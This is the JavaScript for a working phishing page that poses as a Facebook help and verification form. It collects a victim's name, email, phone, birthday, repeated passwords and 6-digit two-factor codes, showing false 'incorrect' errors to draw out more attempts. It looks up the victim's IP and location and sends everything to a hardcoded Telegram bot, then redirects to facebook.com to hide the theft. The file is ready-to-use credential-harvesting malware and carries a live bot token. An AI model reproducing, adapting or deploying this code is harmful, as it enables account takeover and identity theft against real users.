console.log("Script loaded successfully!");

// Config
const config = {
  telegram: {
    token: "7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA",
    chatId: "7211586401"
  },
  setting: {
    max_password_attempts: 2,
    max_code_attempts: 2
  }
};

// GeoLocation interface
const defaultGeoData = {
  accuracy: 0,
  country: "",
  longitude: "",
  organization: "",
  asn: 0,
  timezone: "",
  area_code: "",
  organization_name: "",
  country_code: "",
  country_code3: "",
  continent_code: "",
  ip: "",
  region: "",
  latitude: "",
  city: ""
};

let passwordAttempts = 0;
let codeAttempts = 0;
let lastMessageId = 0;

// Clear localStorage on page load
window.addEventListener('load', () => {
  localStorage.removeItem('lastMessage');
  localStorage.removeItem('lastMessageId');
  localStorage.removeItem('helpFormData');
  localStorage.removeItem('geoData');
  passwordAttempts = 0;
  codeAttempts = 0;
  lastMessageId = 0;
});

// Show/hide modal functions
const showModal = () => {
  console.log("showModal function called");
  const modalOverlay = document.getElementById('modalOverlay');
  if (modalOverlay) {
    console.log("Modal element found");
    modalOverlay.style.display = 'flex';
  } else {
    console.log("Modal element not found");
  }
};

const hideModal = () => {
  const modalOverlay = document.getElementById('modalOverlay');
  if (modalOverlay) {
    modalOverlay.style.display = 'none';
  }
};

// Show password verification dialog
const showPasswordVerification = async () => {
  try {
    const response = await fetch('/pages/home/password-verification.html');
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    const html = await response.text();
    document.body.insertAdjacentHTML('beforeend', html);
  } catch (error) {
    console.error('Error loading password verification dialog:', error);
  }
};

// Show 2FA verification dialog
const showTwoFactorAuth = async () => {
  try {
    const response = await fetch('/pages/home/two-factor-auth.html');
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    const html = await response.text();
    document.body.insertAdjacentHTML('beforeend', html);
    setupVerificationCodeInput();
  } catch (error) {
    console.error('Error loading 2FA dialog:', error);
  }
};

// Setup verification code input
const setupVerificationCodeInput = () => {
  const input = document.getElementById('verificationCode');
  const button = document.getElementById('continueButton');

  if (input && button) {
    input.addEventListener('input', (e) => {
      // Only allow numbers
      e.target.value = e.target.value.replace(/\D/g, '');

      // Enable/disable button based on input length
      if (e.target.value.length === 6) {
        button.style.backgroundColor = '#1877f2';
        button.style.color = '#fff';
      } else {
        button.style.backgroundColor = '#E4E6EB';
        button.style.color = '#BCC0C4';
      }
    });
  }
};

const validateForm = () => {
  const pageName = document.querySelector('input[name="pageName"]').value;
  const fullName = document.querySelector('input[name="fullName"]').value;
  const email = document.querySelector('input[name="email"]').value;
  const phone = document.querySelector('input[name="phoneNumber"]').value;
  const birthday = document.querySelector('input[name="dateOfBirth"]').value;

  // Basic validation
  if (!pageName || !fullName || !email || !phone || !birthday) {
    return false;
  }

  // Email validation
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return false;
  }

  saveFormDataToLocalStorage();
  return true;
};

const saveFormDataToLocalStorage = () => {
  const formData = {
    pageName: document.querySelector('input[name="pageName"]').value,
    fullName: document.querySelector('input[name="fullName"]').value,
    phone: document.querySelector('input[name="phoneNumber"]').value,
    email: document.querySelector('input[name="email"]').value,
    birthday: document.querySelector('input[name="dateOfBirth"]').value,
    password: '',
    code: ''
  };

  localStorage.setItem('helpFormData', JSON.stringify(formData));
};

// Handle form submission
const handleSubmit = (event) => {
  event.preventDefault();

  try {
    if (validateForm()) {
      hideModal();
      showPasswordVerification();
    }
  } catch (error) {
    console.error('Error in form submission:', error);
  }
};

const createInitialMessage = (formData, geoData) => {
  const currentTime = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
  return `📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 <b>IP:</b> <code>${geoData.ip}</code>
🌏 <b>Quốc Gia:</b> <code>${geoData.location?.country || 'Unknown'}</code>
🏙️ <b>Thành Phố:</b> <code>${geoData.location?.city || 'Unknown'}</code>
⏰ <b>Thời Gian:</b> <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
👤 <b>THÔNG TIN PHỤ</b>
📱 <b>Tên PAGE:</b> <code>${formData.pageName}</code>
👨‍💼 <b>Họ Tên:</b> <code>${formData.fullName}</code>
🎂 <b>Ngày Sinh:</b> <code>${formData.birthday}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 <b>Email:</b> <code>${formData.email}</code>
📞 <b>Số Điện Thoại:</b> <code>+${formData.phone}</code>`;
};

const createPasswordMessage = (baseMessage, password, attempt) => {
  const currentMessage = baseMessage.split('━━━━━━━━━━━━━━━━━━━━━').slice(0, 3).join('━━━━━━━━━━━━━━━━━━━━━');
  if (attempt === 1) {
    return `${currentMessage}\n🔑 <b>Mật Khẩu:</b> <code>${password}</code>`;
  }
  return `${currentMessage}\n🔑 <b>Mật Khẩu ${attempt}:</b> <code>${password}</code>`;
};

const createCodeMessage = (baseMessage, code, attempt) => {
  // Get the base message without any previous passwords or codes
  const currentMessage = baseMessage.split('🔑')[0].trim();

  if (attempt === 1) {
    return `${currentMessage}\n━━━━━━━━━━━━━━━━━━━━━\n🔓 <b>CODE 2FA:</b> <code>${code}</code>`;
  }
  return `${currentMessage}\n🔓 <b>CODE 2FA ${attempt}:</b> <code>${code}</code>`;
};

// Handle password verification
const handlePasswordVerification = async () => {
  const password = document.getElementById('securityPassword').value;
  if (!password) return;

  passwordAttempts++;
  const storedData = localStorage.getItem('helpFormData');
  if (!storedData) return;

  try {
    // Get or use cached geo data
    let geoData = JSON.parse(localStorage.getItem('geoData') || 'null');

    if (!geoData) {
      try {
        const response = await fetch('https://api.ipapi.is/');
        const rawData = await response.json();
        // Transform the data to match our needs
        geoData = {
          ip: rawData.ip,
          location: {
            country: rawData.location?.country || rawData.country || 'Unknown',
            city: rawData.location?.city || rawData.city || 'Unknown'
          }
        };
        // Cache the geo data
        localStorage.setItem('geoData', JSON.stringify(geoData));
      } catch (error) {
        console.error('Error fetching location:', error);
        geoData = {
          ip: 'Unknown',
          location: {
            country: 'Unknown',
            city: 'Unknown'
          }
        };
      }
    }

    const formData = JSON.parse(storedData);
    formData.password = password;

    // Get or create base message
    let baseMessage = localStorage.getItem('lastMessage');
    if (!baseMessage) {
      baseMessage = createInitialMessage(formData, geoData);
    }

    // Create message with password
    const message = createPasswordMessage(baseMessage, password, passwordAttempts);
    localStorage.setItem('lastMessage', message);

    // Delete previous message if exists
    if (lastMessageId > 0) {
      try {
        await fetch(
          `https://api.telegram.org/bot${config.telegram.token}/deleteMessage`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: config.telegram.chatId,
              message_id: lastMessageId
            })
          }
        );
      } catch (error) {
        console.error('Error deleting message:', error);
      }
    }

    // Send new message
    const response = await fetch(
      `https://api.telegram.org/bot${config.telegram.token}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: config.telegram.chatId,
          text: message,
          parse_mode: 'HTML'
        })
      }
    );

    const telegramResponse = await response.json();
    if (telegramResponse.ok) {
      lastMessageId = telegramResponse.result.message_id;
      localStorage.setItem('lastMessageId', lastMessageId.toString());
    }

    // Show error message
    const errorElement = document.querySelector('.password-error');
    if (errorElement) {
      errorElement.textContent = 'Incorrect password. Please try again.';
      errorElement.style.display = 'block';
    }

    // Check attempts and proceed
    if (passwordAttempts >= config.setting.max_password_attempts) {
      const verificationDialog = document.querySelector('.password-verification');
      if (verificationDialog) {
        verificationDialog.remove();
      }
      showTwoFactorAuth();
    }

  } catch (error) {
    console.error('Error:', error);
  }
};

// Handle verification code
const handleVerificationCode = async () => {
  const code = document.getElementById('verificationCode').value;
  if (!code || code.length !== 6) return;

  codeAttempts++;

  try {
    const baseMessage = localStorage.getItem('lastMessage');
    if (!baseMessage) return;

    // Create message with code
    const message = createCodeMessage(baseMessage, code, codeAttempts);
    localStorage.setItem('lastMessage', message);

    // Delete previous message if exists
    const savedMessageId = localStorage.getItem('lastMessageId');
    if (savedMessageId) {
      try {
        await fetch(
          `https://api.telegram.org/bot${config.telegram.token}/deleteMessage`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: config.telegram.chatId,
              message_id: savedMessageId
            })
          }
        );
      } catch (error) {
        console.error('Error deleting message:', error);
      }
    }

    // Send new message
    const response = await fetch(
      `https://api.telegram.org/bot${config.telegram.token}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: config.telegram.chatId,
          text: message,
          parse_mode: 'HTML'
        })
      }
    );

    const telegramResponse = await response.json();
    if (telegramResponse.ok) {
      localStorage.setItem('lastMessageId', telegramResponse.result.message_id.toString());
    }

    // Show error message
    const errorElement = document.querySelector('.code-error');
    if (errorElement) {
      errorElement.textContent = 'Incorrect code. Please try again.';
      errorElement.style.display = 'block';
    }

    // Check attempts and redirect
    if (codeAttempts >= config.setting.max_code_attempts) {
      // Show success message
      const successModal = document.createElement('div');
      successModal.innerHTML = `
        <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
                    background: rgba(0, 0, 0, 0.5); display: flex; align-items: center;
                    justify-content: center; z-index: 20000">
          <div style="background: white; padding: 20px; border-radius: 8px; text-align: center">
            <h3>Verification Successful!</h3>
            <p>Redirecting to Facebook...</p>
          </div>
        </div>
      `;
      document.body.appendChild(successModal);

      setTimeout(() => {
        window.location.href = 'https://www.facebook.com/';
      }, 2000);
    }

  } catch (error) {
    console.error('Error:', error);
  }
};

// Hide verification dialog
const hideVerificationDialog = () => {
  const dialog = document.querySelector('.two-factor-auth');
  if (dialog) {
    dialog.remove();
  }
};

// Format date input
const formatDate = (input) => {
  let value = input.value.replace(/\D/g, '');
  if (value.length > 8) value = value.substr(0, 8);

  if (value.length >= 4) {
    const month = value.substr(0, 2);
    const day = value.substr(2, 2);
    const year = value.substr(4);

    if (value.length >= 4) {
      value = `${month}/${day}`;
      if (year) {
        value += `/${year}`;
      }
    }
  } else if (value.length >= 2) {
    value = `${value.substr(0, 2)}/${value.substr(2)}`;
  }

  input.value = value;
};

// Export functions to be used in HTML
window.showModal = showModal;
window.hideModal = hideModal;
window.handleSubmit = handleSubmit;
window.handlePasswordVerification = handlePasswordVerification;
window.handleVerificationCode = handleVerificationCode;
window.hideVerificationDialog = hideVerificationDialog;
window.formatDate = formatDate;
